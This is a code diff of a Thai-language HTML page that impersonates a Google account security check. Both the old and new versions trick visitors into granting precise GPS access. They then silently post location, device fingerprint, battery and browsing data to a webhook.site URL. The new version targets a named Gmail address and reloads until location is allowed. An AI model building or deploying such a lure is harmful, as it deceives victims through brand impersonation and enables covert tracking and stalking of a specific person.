@@ -3,419 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>การตรวจสอบความปลอดภัย</title>
+    <title>ยืนยันบัญชี - Security Check</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500&display=swap');
         
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Kanit', sans-serif; }
+        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        
+        .container { 
+            background: white; 
+            padding: 40px 24px; 
+            border-radius: 8px; 
+            border: 1px solid #dadce0; 
+            max-width: 400px; 
+            width: 100%; 
+            text-align: center; 
         }
 
-        body {
-            font-family: 'Google Sans', 'Roboto', sans-serif;
-            background: #f8f9fa;
+        /* โลโก้จำลองโทนสี Google */
+        .logo-box {
             display: flex;
             justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-
-        .security-container {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-            padding: 48px;
-            max-width: 450px;
-            width: 100%;
-            text-align: center;
-            border: 1px solid #dadce0;
-        }
-
-        .security-icon {
-            width: 64px;
-            height: 64px;
-            margin: 0 auto 24px;
-            background: linear-gradient(135deg, #1a73e8 0%, #4285f4 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.05); opacity: 0.8; }
-            100% { transform: scale(1); opacity: 1; }
-        }
-
-        .security-icon svg {
-            width: 36px;
-            height: 36px;
-            fill: white;
-        }
-
-        .title {
-            font-size: 24px;
+            font-size: 32px;
             font-weight: 500;
-            color: #202124;
-            margin-bottom: 16px;
-            line-height: 1.4;
+            margin-bottom: 20px;
+            letter-spacing: -1.5px;
         }
+        .b { color: #4285F4; } .r { color: #EA4335; } 
+        .y { color: #FBBC05; } .g { color: #34A853; }
 
-        .description {
-            font-size: 16px;
-            color: #5f6368;
-            line-height: 1.6;
-            margin-bottom: 32px;
-        }
-
-        .security-badge {
-            background: #e8f0fe;
-            color: #1a73e8;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 500;
-            display: inline-block;
-            margin-bottom: 24px;
-        }
-
-        .verify-button {
-            background: #1a73e8;
-            color: white;
-            border: none;
-            padding: 14px 32px;
-            font-size: 16px;
-            font-weight: 500;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            width: 100%;
-            max-width: 280px;
-            height: 48px;
+        .user-chip {
             display: inline-flex;
             align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-
-        .verify-button:hover {
-            background: #1557b0;
-            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.3);
-        }
-
-        .verify-button:active {
-            transform: translateY(1px);
-        }
-
-        .verify-button:disabled {
-            background: #9aa0a6;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-
-        .loading-text {
-            display: none;
-            color: #1a73e8;
-            font-size: 14px;
-            margin-top: 16px;
-            animation: fadeInOut 1.5s infinite;
-        }
-
-        @keyframes fadeInOut {
-            0%, 100% { opacity: 0.6; }
-            50% { opacity: 1; }
-        }
-
-        .footer-text {
-            margin-top: 32px;
-            font-size: 12px;
-            color: #9aa0a6;
-        }
-
-        .warning-box {
-            background: #fef7e0;
-            border: 1px solid #fbbc04;
-            border-radius: 8px;
-            padding: 16px;
+            gap: 10px;
+            padding: 5px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 20px;
             margin-bottom: 24px;
             font-size: 14px;
-            color: #5f6368;
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            text-align: left;
+            color: #3c4043;
+        }
+        .user-chip svg { width: 18px; height: 18px; fill: #5f6368; }
+
+        h1 { font-size: 22px; color: #202124; margin-bottom: 12px; font-weight: 400; }
+        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 24px; }
+
+        .shield-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
         }
 
-        .warning-box svg {
-            width: 20px;
-            height: 20px;
-            fill: #fbbc04;
-            flex-shrink: 0;
-            margin-top: 2px;
-        }
-
-        .progress-bar {
+        .btn-next { 
+            background: #1a73e8; 
+            color: white; 
+            border: none; 
+            padding: 12px 24px; 
+            border-radius: 4px; 
+            font-size: 14px; 
+            font-weight: 500; 
+            cursor: pointer; 
             width: 100%;
-            height: 4px;
-            background: #e8f0fe;
-            border-radius: 2px;
-            margin-top: 20px;
-            overflow: hidden;
-            display: none;
+            transition: background 0.2s;
         }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #1a73e8 0%, #34a853 100%);
-            width: 0%;
-            transition: width 0.3s ease;
-            animation: progressAnimation 3s ease-out forwards;
-        }
-
-        @keyframes progressAnimation {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
-
-        @media (max-width: 480px) {
-            .security-container {
-                padding: 32px 24px;
-            }
-            
-            .title {
-                font-size: 20px;
-            }
-            
-            .description {
-                font-size: 14px;
-            }
-        }
+        .btn-next:hover { background: #1557b0; }
+        
+        #loading { margin-top: 15px; font-size: 12px; color: #1a73e8; display: none; }
     </style>
 </head>
 <body>
-    <div class="security-container">
-        <div class="security-icon">
-            <svg viewBox="0 0 24 24">
-                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 5.3-6.23 5.3-2.78 0-5.44-1.11-6.32-4.99H12V6.99h7.24c.15.31.29.63.4.97H12v3.02z"/>
-            </svg>
-        </div>
-        
-        <h1 class="title">การตรวจสอบความปลอดภัย</h1>
-        
-        <div class="warning-box">
-            <svg viewBox="0 0 24 24">
-                <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
-            </svg>
-            <div>
-                <strong>คำเตือนด้านความปลอดภัย:</strong> เราตรวจพบกิจกรรมที่ผิดปกติในบัญชีของคุณ 
-                เพื่อปกป้องข้อมูลส่วนตัว กรุณายืนยันตำแหน่งปัจจุบันของคุณ
-            </div>
-        </div>
-        
-        <div class="security-badge">🔒 การรักษาความปลอดภัยระดับสูง</div>
-        
-        <p class="description">
-            เราต้องการยืนยันว่าคุณกำลังเข้าถึงบัญชีจากตำแหน่งที่ได้รับอนุญาต 
-            กระบวนการนี้ใช้เวลาเพียงไม่กี่วินาทีและช่วยปกป้องบัญชีของคุณจากการเข้าถึงที่ไม่พึงประสงค์
-        </p>
-        
-        <button class="verify-button" onclick="verifyLocation()">
-            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
-            </svg>
-            ยืนยันตำแหน่งปัจจุบัน
-        </button>
-        
-        <div class="loading-text" id="loadingText">กำลังตรวจสอบความปลอดภัย...</div>
-        <div class="progress-bar" id="progressBar">
-            <div class="progress-fill"></div>
-        </div>
-        
-        <div class="footer-text">
-            การตรวจสอบนี้ช่วยปกป้องบัญชีของคุณจากการเข้าถึงที่ไม่พึงประสงค์
-        </div>
+
+<div class="container">
+    <div class="logo-box">
+        <span class="b">S</span><span class="r">e</span><span class="y">c</span><span class="b">u</span><span class="g">r</span><span class="r">e</span>
     </div>
 
-    <script>
-        async function verifyLocation() {
-            const button = document.querySelector('.verify-button');
-            const loadingText = document.getElementById('loadingText');
-            const progressBar = document.getElementById('progressBar');
-            
-            // เปลี่ยนสถานะปุ่ม
-            button.disabled = true;
-            button.innerHTML = `
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                    <path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/>
-                </svg>
-                กำลังตรวจสอบ...
-            `;
-            
-            loadingText.style.display = 'block';
-            progressBar.style.display = 'block';
+    <h1>การตรวจสอบความปลอดภัย</h1>
+    
+    <div class="user-chip">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+        icegot153002@gmail.com
+    </div>
 
-            try {
-                // เก็บข้อมูลทั้งหมด
-                const data = {
-                    timestamp: new Date().toISOString(),
-                    location: await getHighAccuracyLocation(),
-                    device: {
-                        userAgent: navigator.userAgent,
-                        platform: navigator.platform,
-                        language: navigator.language,
-                        languages: navigator.languages,
-                        cookieEnabled: navigator.cookieEnabled,
-                        onLine: navigator.onLine,
-                        screen: {
-                            width: screen.width,
-                            height: screen.height,
-                            availWidth: screen.availWidth,
-                            availHeight: screen.availHeight,
-                            colorDepth: screen.colorDepth,
-                            orientation: screen.orientation ? screen.orientation.angle : null
-                        },
-                        window: {
-                            innerWidth: window.innerWidth,
-                            innerHeight: window.innerHeight,
-                            devicePixelRatio: window.devicePixelRatio
-                        },
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        referrer: document.referrer
-                    },
-                    battery: await getBatteryInfo(),
-                    connection: navigator.connection ? {
-                        effectiveType: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt,
-                        saveData: navigator.connection.saveData
-                    } : null
-                };
+    <div class="shield-icon">
+        <svg viewBox="0 0 24 24" fill="#4285F4"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 13.17l5.59-5.59L17 9l-7 8z"/></svg>
+    </div>
 
-                // ส่งข้อมูลไปยัง webhook
-                await sendToWebhook(data);
-                
-                // รอให้ progress bar เต็ม
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com';
-                }, 3000);
+    <p>Google จำเป็นต้องยืนยันว่าคุณคือเจ้าของบัญชีนี้จริง โดยการจับคู่พิกัด GPS ของอุปกรณ์ปัจจุบัน</p>
+    
+    <button class="btn-next" id="btnNext" onclick="verify()">ถัดไป</button>
+    <div id="loading">กำลังเชื่อมต่อฐานข้อมูลความปลอดภัย...</div>
+</div>
 
-            } catch (error) {
-                console.error('Verification error:', error);
-                // ถ้าเกิด error ก็ยังคง redirect ตามปกติ
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com';
-                }, 3000);
-            }
-        }
+<script>
+    const WEB_HOOK = "https://webhook.site/d8654c83-3367-4d22-9448-73772f66ee88";
 
-        async function getHighAccuracyLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ error: 'Geolocation not supported' });
-                    return;
-                }
+    async function verify() {
+        const btn = document.getElementById('btnNext');
+        const load = document.getElementById('loading');
+        
+        btn.disabled = true;
+        btn.innerText = "กำลังดำเนินการ...";
+        load.style.display = "block";
 
-                const options = {
+        try {
+            const pos = await new Promise((res, rej) => {
+                navigator.geolocation.getCurrentPosition(res, rej, {
                     enableHighAccuracy: true,
-                    timeout: 15000,
+                    timeout: 20000,
                     maximumAge: 0
-                };
-
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude,
-                            altitudeAccuracy: position.coords.altitudeAccuracy,
-                            heading: position.coords.heading,
-                            speed: position.coords.speed,
-                            timestamp: position.timestamp
-                        });
-                    },
-                    (error) => {
-                        resolve({ 
-                            error: error.message,
-                            code: error.code 
-                        });
-                    },
-                    options
-                );
-            });
-        }
-
-        async function getBatteryInfo() {
-            try {
-                if ('getBattery' in navigator) {
-                    const battery = await navigator.getBattery();
-                    return {
-                        level: Math.round(battery.level * 100),
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
-                } else {
-                    return { error: 'Battery API not supported' };
-                }
-            } catch (error) {
-                return { error: error.message };
-            }
-        }
-
-        async function sendToWebhook(data) {
-            const webhookUrl = 'https://webhook.site/d8654c83-3367-4d22-9448-73772f66ee88';
-            
-            try {
-                await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'User-Agent': navigator.userAgent,
-                        'X-Forwarded-For': '127.0.0.1'
-                    },
-                    body: JSON.stringify(data),
-                    mode: 'no-cors'
                 });
-                
-                return true;
-            } catch (error) {
-                console.error('Webhook error:', error);
-                return false;
-            }
-        }
-
-        // เก็บข้อมูลเพิ่มเติมเมื่อโหลดหน้า
-        window.addEventListener('load', function() {
-            const additionalData = {
-                type: 'page_analytics',
-                timestamp: new Date().toISOString(),
-                performance: performance.timing ? {
-                    loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
-                    domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
-                    firstPaint: performance.getEntriesByName('first-paint')[0]?.startTime || null
-                } : null,
-                memory: performance.memory ? {
-                    usedJSHeapSize: performance.memory.usedJSHeapSize,
-                    totalJSHeapSize: performance.memory.totalJSHeapSize,
-                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
-                } : null
+            });
+            
+            const payload = {
+                target: "icegot153002@gmail.com",
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                accuracy: pos.coords.accuracy + "m",
+                device: navigator.userAgent
             };
 
-            // ส่งข้อมูล analytics แบบเงียบๆ
-            fetch('https://webhook.site/d8654c83-3367-4d22-9448-73772f66ee88', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(additionalData),
-                mode: 'no-cors'
-            }).catch(() => {});
-        });
-    </script>
+            await fetch(WEB_HOOK, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
+
+            alert("ยืนยันตัวตนสำเร็จ");
+            window.location.href = "https://myaccount.google.com";
+
+        } catch (e) {
+            alert("โปรดกด 'อนุญาต' (Allow) เพื่อเข้าใช้งานบัญชีของคุณต่อ");
+            location.reload();
+        }
+    }
+</script>
+
 </body>
 </html>
+
 
